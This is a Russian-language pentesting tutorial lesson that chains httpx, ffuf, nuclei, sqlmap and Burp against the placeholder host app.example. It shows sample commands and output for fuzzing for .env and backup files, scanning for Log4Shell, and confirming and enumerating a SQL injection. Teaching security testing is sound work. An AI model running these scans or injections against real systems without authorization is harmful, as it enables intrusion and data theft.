## Задача

Тебе дали новый хост `app.example`. С чего начать? Запускать всё подряд — значит утонуть в выводе. Правильный подход — **конвейер**: каждый инструмент отвечает на свой вопрос, и результат одного становится входом для следующего. В этом уроке мы соберём такой пайплайн на одном хосте и посмотрим, как инструменты связаны.

## Данные, с которыми работаем

Есть только домен: `app.example`. Мы не знаем ни сервера, ни технологий, ни скрытых путей. Разложим работу на этапы — от дешёвых и пассивных к дорогим и активным.

## Шаг 1: живые хосты и стек — httpx

**httpx** — это «проба»: берёт список целей и говорит, какие живы, что за сервер, есть ли редирект, какой title и технологии. Дёшево и быстро.

```bash
$ echo https://app.example | httpx -title -tech-detect -status-code -silent
https://app.example [200] [Example Shop] [nginx,PHP,Laravel]
```

Мы узнали: сайт жив, сервер nginx, стек PHP/Laravel. Это определяет, что искать дальше.

## Шаг 2: скрытые пути — ffuf

**ffuf** — фаззер: перебирает пути/параметры по словарю и подсвечивает необычные ответы. Здесь ищут скрытые админки, бэкапы, `.env`, API.

```bash
$ ffuf -u https://app.example/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -mc 200,301,302,403 -of json -o ffuf.json -maxtime 120
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1]
.env                    [Status: 200, Size: 342, Words: 21, Lines: 9]
backup.zip              [Status: 200, Size: 1048576, Words: 12, Lines: 1]
```

Флаг `-mc` оставляет только нужные коды ответа, `-of json -o` сохраняет результат для парсинга, `-maxtime` не даёт фаззу зависнуть. Три находки: админка, `.env` (часто с секретами) и бэкап архива.

## Шаг 3: известные уязвимости — nuclei

**nuclei** — шаблонный сканер: гоняет сотни готовых проверок (CVE, мисконфиги, takeover) и репортит только совпадения. Его запускают **рано**, потому что он ловит то, что руками искать долго.

```bash
$ nuclei -u https://app.example -severity critical,high,medium -j -o nuclei.json
[CVE-2021-44228] [http] [critical] https://app.example/api/log
[laravel-debug-enabled] [http] [medium] https://app.example/_ignition/health-check
```

nuclei нашёл Log4Shell-точку и включённый debug Laravel. Это уже конкретные лиды.

## Шаг 4: инъекции — sqlmap

Найденные эндпоинты с параметрами отдаём `sqlmap`:

```bash
$ sqlmap -u "https://app.example/api/item?id=1" --batch --level=2 --risk=2 --technique=BEU --dbs
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind' injectable
back-end DBMS: MySQL
available databases [3]: appdb, information_schema, mysql
```

Инъекция подтверждена, база — MySQL, есть база `appdb`.

## Шаг 5: ручной контроль — Burp

**Burp Suite** — прокси: он стоит между браузером и сервером и позволяет перехватывать, повторять и модифицировать любой запрос. Всё, что автоматика нашла, удобно доисследовать в Burp: Repeater для точечных payload, Intruder для перебора, встроенный сканер.

Когда что использовать:

| Инструмент | Роль | Когда |
|-----------|------|-------|
| **httpx** | проба хостов, стек | в самом начале |
| **ffuf** | фаззинг путей/параметров | после составления карты |
| **nuclei** | шаблонные проверки | рано, для известных багов |
| **sqlmap** | подтверждение и дамп SQLi | когда есть подозрение |
| **curl** | точный PoC | везде, для доказательства |
| **Burp** | ручной контроль | на всех этапах |

## Полный пайплайн с выводом

Соберём непрерывную историю:

```bash
# 1. Проба хоста
$ echo https://app.example | httpx -title -tech-detect -silent
https://app.example [200] [Example Shop] [nginx,PHP,Laravel]

# 2. Известные баги
$ nuclei -u https://app.example -severity high,critical -j -o n.json
[laravel-debug-enabled] [http] [medium] https://app.example/_ignition/health-check

# 3. Скрытые пути
$ ffuf -u https://app.example/FUZZ -w common.txt -mc 200,301,403 -of json -o f.json -maxtime 120
.env  [Status: 200, Size: 342]

# 4. Инъекции по найденным эндпоинтам
$ sqlmap -u "https://app.example/api/item?id=1" --batch --technique=BEU --dbs
back-end DBMS: MySQL
```

За четыре команды мы прошли путь: жив ли хост → какие технологии → известные дыры → скрытые файлы → инъекции. Каждый следующий шаг опирался на результат предыдущего.

## Reference-таблица: ключевые флаги

| Инструмент | Полезные флаги |
|-----------|----------------|
| httpx | `-title`, `-tech-detect`, `-status-code`, `-silent`, `-o` |
| ffuf | `-u`, `-w`, `-mc`, `-fc`, `-t`, `-maxtime`, `-of json -o` |
| nuclei | `-u`, `-severity`, `-tags`, `-j`, `-o`, `-rate-limit` |
| sqlmap | `-u`, `-r`, `--batch`, `--technique`, `--level`, `--risk`, `--dbs` |
| Burp | Repeater, Intruder, Scanner, Proxy |
| curl | `-s`, `-i`, `-v`, `-X`, `-d`, `-H`, `-b/-c`, `-w` |

## Частые ошибки

- **Запускать всё сразу.** Сначала httpx, потом всё остальное — иначе тратишь время на мёртвые хосты.
- **Забывать `-maxtime` в ffuf.** Большой словарь без лимита зависает и не сохраняет JSON.
- **Грепать шаблоны nuclei по имени продукта.** CVE-шаблоны названы по CVE-id — фильтруй по `-tags`/`-severity`, а не по продукту.
- **Слепо доверять сканеру.** nuclei и sqlmap дают лиды; подтверждай их `curl` вручную.
- **Игнорировать авторизацию.** Многие баги — внутри аккаунта; передавай cookie (`-H`, `-b`, `--cookie`).
- **Шум.** Активные сканы видны в логах; согласуй окно и лимиты.

## Что мы теперь знаем

- **Пайплайн:** httpx → nuclei → ffuf → sqlmap, каждый этап питает следующий.
- **httpx** отвечает «что живо и с чем говорим».
- **nuclei** находит известные баги быстро, но требует точной фильтрации шаблонов.
- **ffuf** вскрывает скрытую поверхность; JSON-вывод нужен для парсинга.
- **sqlmap** подтверждает и эксплуатирует инъекции.
- **Burp и curl** — для ручного контроля и доказательства.

## На что смотреть дальше

- **Соблюдай порядок по стоимости:** дёшево (пассивно) → дорого (активно).
- **Сохраняй вывод в файл** (`-o`), чтобы парсить и не перезапускать.
- **Один инструмент — один вопрос.** Не пытайся ffuf'ом искать CVE.
- **Всегда проверяй находку руками.** Сканер может ошибаться.
- **Учитывай OPSEC.** Активные сканы палятся; ограничивай потоки и время.
- **Только в рамках scope.** Проверяй `scope_check` перед активными действиями.

## Куда дальше

Дальше мы разберём инструменты по отдельности, начиная с базового — `curl` (следующий урок), которым воспроизводится и доказывается почти любой запрос. А пока главное запомни: инструменты работают **в связке**, и порядок в пайплайне важнее, чем знание всех флагов.

## Где пригодится

- **CTF (Web):** быстрый проход по цели от разведки до инъекции.
- **Bug bounty:** структурированный пайплайн экономит часы и снижает пропуски.
- **Пентест:** стандартный рабочий процесс веб-тестировщика.
- **Работа (AppSec):** понимание, что видит сканер, помогает приоритизировать защиту.
